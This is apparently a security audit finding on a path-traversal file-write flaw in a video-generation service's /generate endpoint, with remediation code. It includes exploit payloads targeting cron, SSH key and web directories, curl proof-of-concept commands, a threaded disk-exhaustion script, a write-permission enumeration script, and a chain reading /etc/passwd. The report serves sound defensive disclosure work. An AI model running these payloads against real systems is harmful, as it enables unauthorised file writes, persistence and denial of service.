# VULN-DF-PY-002: Path Traversal (Arbitrary File Write)

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **ID** | VULN-DF-PY-002 |
| **Type** | Path Traversal (Write) |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **Severity** | High |
| **Confidence** | 85 (CONFIRMED) |
| **Location** | `examples/service/worker.py:195-201` |
| **Function** | `generate()` |
| **Source Module** | examples/service |

## Vulnerability Description

The `save_disk_path` field from HTTP requests is passed directly to `save_video()` without any path validation or sanitization. An attacker can exploit this vulnerability to write files to arbitrary locations on the server by using path traversal sequences (`../`) in the `save_disk_path` parameter.

### Vulnerable Code

```python
# examples/service/worker.py:195-201
save_video(
    tensor=video[None],
    save_file=request.save_disk_path,
    fps=request.sample_fps,
    nrow=1,
    normalize=True,
    value_range=(-1, 1))
```

### Attack Chain

```
HTTP POST /generate → GeneratorRequest(save_disk_path=...) → worker.py:generate() → save_video(save_file=request.save_disk_path)
```

## Exploitation Analysis

### Attack Vector

1. **Network Accessible**: The service binds to `0.0.0.0:6000` with **no authentication**
2. **Direct Input**: The `save_disk_path` field is a Pydantic `Optional[str]` with no validation beyond type checking
3. **No Sanitization**: No path traversal checks, no whitelist, no symlink checks
4. **User-Controlled Output**: Attacker determines both path AND content (through video generation parameters)

### Exploit Scenarios

#### Scenario 1: Critical System File Overwrite

```http
POST /generate HTTP/1.1
Host: target-server:6000
Content-Type: application/json

{
    "prompt": "malicious content",
    "sample_steps": 40,
    "save_disk_path": "/etc/cron.d/malicious_job"
}
```

**Impact**: 
- Write a cron job file that executes attacker-controlled commands
- Persistent backdoor installation
- Privilege escalation if cron runs with elevated privileges

#### Scenario 2: SSH Authorized Keys Injection

```json
{
    "prompt": "test",
    "sample_steps": 40,
    "save_disk_path": "/root/.ssh/authorized_keys.mp4"
}
```

**Impact**: 
- Although file extension is `.mp4`, attacker can:
  - Rename through subsequent requests
  - Exploit misconfigured systems that ignore extension
  - Use for denial of service (fill disk)

#### Scenario 3: Web Shell Deployment

```json
{
    "prompt": "test",
    "sample_steps": 40,
    "save_disk_path": "/var/www/html/shell.mp4"
}
```

**Impact**: 
- If web server is running, file may become accessible
- Combined with other vulnerabilities, may enable remote code execution

#### Scenario 4: Denial of Service via Disk Fill

```json
{
    "prompt": "fill disk",
    "sample_steps": 50,
    "frame_num": 201,
    "save_disk_path": "/dev/null.mp4"
}
```

**Impact**: 
- Large video files consume disk space
- Multiple parallel requests (Ray distributed workers) amplify attack
- System instability, service unavailability

#### Scenario 5: Configuration File Poisoning

```json
{
    "save_disk_path": "/data/models/config_override.mp4"
}
```

**Impact**: 
- Poison model configuration directories
- Interference with legitimate model loading
- Potential for supply chain attacks

#### Scenario 6: /dev/null Bypass and Log Poisoning

```json
{
    "save_disk_path": "/var/log/app.log.mp4"
}
```

**Impact**: 
- Corrupt log files
- Hide evidence of attacks
- Interfere with monitoring systems

### Amplification via Ray Distributed Execution

The service uses Ray for distributed video generation across multiple workers:

```python
# server.py
self.workers = [
    GeneratorWorker.remote(args, rank=rank, world_size=world_size)
    for rank in range(num_workers)  # 8 workers by default
]

# Attack amplification: All 8 workers may write to same path
results = ray.get([
    worker.generate.remote(request)
    for worker in self.workers
])
```

**Amplification Effect**: A single request triggers writes from up to 8 workers simultaneously, enabling:
- Faster disk exhaustion
- Race condition exploitation
- Increased attack surface

### Impact Assessment

| Impact Category | Severity | Description |
|-----------------|----------|-------------|
| **File System Compromise** | **Critical** | Arbitrary file write enables system file modification, backdoor installation |
| **Privilege Escalation** | **High** | Cron jobs, systemd units, SSH keys can enable root access |
| **Denial of Service** | **High** | Disk exhaustion, critical file corruption |
| **Data Integrity** | **High** | Model files, configuration poisoning |
| **Remote Code Execution** | **Medium** | Possible via cron/web shell deployment |
| **Business Impact** | **Critical** | System compromise, data loss, service disruption |

### Attack Prerequisites

| Requirement | Status |
|-------------|--------|
| Network access to port 6000 | Required (no firewall assumed) |
| Authentication | **NONE** - service is unauthenticated |
| File permissions | Write permissions in target directories |
| Directory traversal | Some directories may be write-protected |

## Proof of Concept

### Basic Path Traversal Write Test

```bash
# Test relative path traversal
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"save_disk_path":"../../../tmp/malicious.mp4"}'

# Test absolute path write
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"save_disk_path":"/tmp/pwned.mp4"}'
```

### Critical File Overwrite Attack

```bash
# Attempt to overwrite system file (requires appropriate permissions)
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"backdoor","sample_steps":40,"save_disk_path":"/etc/cron.d/backdoor"}'
```

### Disk Exhaustion Attack

```python
#!/usr/bin/env python3
import requests
import sys
import threading

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:6000"
THREADS = 50

def exhaust_disk():
    """Send large video generation requests."""
    requests.post(f"{TARGET}/generate", json={
        "prompt": "disk fill attack",
        "sample_steps": 50,  # Maximum steps
        "frame_num": 201,    # Maximum frames (~40MB+ per video)
        "save_disk_path": f"/tmp/fill_{threading.current_thread().name}.mp4"
    })

if __name__ == "__main__":
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=exhaust_disk, name=f"fill_{i}")
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print(f"Launched {THREADS} disk exhaustion requests")
```

### Enumeration and Write Testing

```python
#!/usr/bin/env python3
import requests
import os

WRITE_TARGETS = [
    "/tmp/test_write.mp4",
    "/var/tmp/test.mp4",
    "/data/test.mp4",
    "/home/test.mp4",
    "/root/test.mp4",
]

def test_write_permission(target, path):
    try:
        r = requests.post(f"{target}/generate", json={
            "prompt": "permission test",
            "sample_steps": 10,
            "save_disk_path": path
        }, timeout=30)
        
        if r.status_code == 200:
            print(f"[WRITABLE] {path}")
        elif "Permission denied" in r.text or "cannot open" in r.text:
            print(f"[NOT WRITABLE] {path}")
        else:
            print(f"[UNKNOWN] {path} - Status: {r.status_code}")
    except Exception as e:
        print(f"[ERROR] {path} - {e}")

if __name__ == "__main__":
    target = "http://localhost:6000"
    for p in WRITE_TARGETS:
        test_write_permission(target, p)
```

## Root Cause Analysis

### Why This Vulnerability Exists

1. **Missing Input Validation**: The Pydantic model only validates type (Optional[str]), not content
2. **Direct File API Usage**: `save_video()` is used directly without safe wrappers
3. **No Directory Whitelist**: User can specify any path on the filesystem
4. **User-Controlled Output**: Video content is generated based on attacker-provided parameters
5. **Ray Amplification**: Multiple workers may write simultaneously

### Default Path Behavior Analysis

```python
# worker.py:187-192 - Default path generation (when save_disk_path is None)
if request.save_disk_path is None:
    formatted_time = datetime.datetime.now(tz=datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
    formatted_prompt = request.prompt.replace(" ", "_").replace("/", "_")[:50]
    suffix = '.mp4'
    size_format = request.size.replace('*', 'x') if sys.platform == 'win32' else request.size
    request.save_disk_path = f"{size_format}_{formatted_prompt}_{formatted_time}{suffix}"
```

**Observation**: Even default path generation has minimal sanitization:
- `prompt.replace("/", "_")` - Only sanitizes forward slashes
- No backslash sanitization (`\` on Windows)
- No `..` traversal prevention
- No absolute path check

### Unused Security Controls

The project has `safe_open()` in `mindiesd/utils/file_utils.py` with comprehensive checks:
- Symlink checks
- Path length limits (4096 characters)
- Permission validation
- Owner verification

**But none of these are used in the save_video path!**

## Remediation Recommendations

### Priority: P0 (Critical - Immediate Fix)

### 1. Path Validation and Directory Whitelist

```python
# In worker.py - Add path validation
import os
from pathlib import Path

OUTPUT_DIR = "/data/output"  # Whitelisted output directory

def validate_output_path(output_path: str) -> str:
    """Validate output path is within allowed directory."""
    if output_path is None:
        return None
    
    # Normalize and resolve path
    abs_path = os.path.realpath(os.path.join(OUTPUT_DIR, output_path))
    
    # Verify path is within whitelist
    allowed_dir = os.path.realpath(OUTPUT_DIR)
    if not abs_path.startswith(allowed_dir + "/"):
        raise ValueError(f"Output path must be within {OUTPUT_DIR}")
    
    # Check for symlink
    if os.path.islink(output_path):
        raise ValueError("Symbolic links are not allowed")
    
    # Validate extension
    if Path(abs_path).suffix.lower() != ".mp4":
        raise ValueError("Output must be .mp4 file")
    
    # Prevent directory creation outside whitelist
    parent_dir = os.path.dirname(abs_path)
    if not os.path.exists(parent_dir):
        raise ValueError("Output directory must exist")
    
    return abs_path

# Usage in generate()
if request.save_disk_path is not None:
    request.save_disk_path = validate_output_path(request.save_disk_path)
else:
    # Generate default path within whitelist
    request.save_disk_path = generate_safe_default_path()

save_video(tensor=video[None], save_file=request.save_disk_path, ...)
```

### 2. Use Existing Safe File Utilities

```python
from mindiesd.utils.file_utils import standardize_path, check_dir_safety

def validate_save_path(path: str):
    """Validate save path using existing safe utilities."""
    if path is None:
        return None
    
    # Check parent directory safety
    parent_dir = os.path.dirname(path)
    check_dir_safety(parent_dir, permission_mode=0o750)
    
    # Standardize and validate path
    safe_path = standardize_path(path, check_link=True)
    
    # Verify within allowed output directory
    OUTPUT_DIR = "/data/output"
    if not safe_path.startswith(os.path.realpath(OUTPUT_DIR)):
        raise ValueError(f"Output must be within {OUTPUT_DIR}")
    
    return safe_path
```

### 3. Add Authentication (Same as VULN-DF-PY-001)

```python
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer

security = HTTPBearer()

@app.post("/generate")
async def generate_image(
    request: GeneratorRequest,
    _: HTTPAuthorizationCredentials = Depends(security)
):
    # Existing logic
```

### 4. Rate Limiting (Prevent Disk Exhaustion)

```python
from fastapi import FastAPI
from fastapi_limiter import FastAPILimiter
from fastapi_limiter.depends import RateLimiter

app = FastAPI()

@app.post("/generate", dependencies=[Depends(RateLimiter(times=5, seconds=60))])
async def generate_image(request: GeneratorRequest):
    # Limit: 5 requests per 60 seconds per IP
```

### 5. Disk Space Monitoring

```python
import shutil

MIN_DISK_SPACE_GB = 10

def check_disk_space(path: str):
    """Ensure sufficient disk space before write."""
    stat = shutil.disk_usage(os.path.dirname(path))
    free_gb = stat.free / (1024**3)
    if free_gb < MIN_DISK_SPACE_GB:
        raise ValueError(f"Insufficient disk space: {free_gb:.2f}GB free")
```

### 6. File Size Limits

```python
MAX_VIDEO_SIZE_MB = 500

def save_video_with_limits(tensor, save_file, **kwargs):
    """Save video with size limits."""
    # Check expected size before generation
    expected_size_mb = estimate_video_size(tensor.shape, kwargs.get('frame_num', 81))
    if expected_size_mb > MAX_VIDEO_SIZE_MB:
        raise ValueError(f"Video too large: {expected_size_mb}MB exceeds {MAX_VIDEO_SIZE_MB}MB limit")
    
    save_video(tensor=tensor, save_file=save_file, **kwargs)
```

## Combined Attack Scenario (VULN-001 + VULN-002)

These two vulnerabilities can be combined for maximum impact:

1. **Read + Write Chain**:
   - Read `/proc/self/environ` to extract secrets (VULN-001)
   - Use secrets to determine attack strategy
   - Write backdoor file (VULN-002)

2. **Full System Compromise**:
   ```json
   {
       "image": "/etc/passwd",  // Enumerate users (READ)
       "save_disk_path": "/etc/cron.d/persistence",  // Install backdoor (WRITE)
       "prompt": "malicious"
   }
   ```

## Testing Recommendations

1. **Unit Tests**: 
   - Path traversal prevention tests
   - Whitelist boundary tests
   - Symlink rejection tests

2. **Integration Tests**:
   - Authentication flow
   - Rate limiting effectiveness
   - Disk space monitoring

3. **Security Regression Tests**:
   - Automated path traversal fuzzing
   - Permission boundary testing

## References

- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)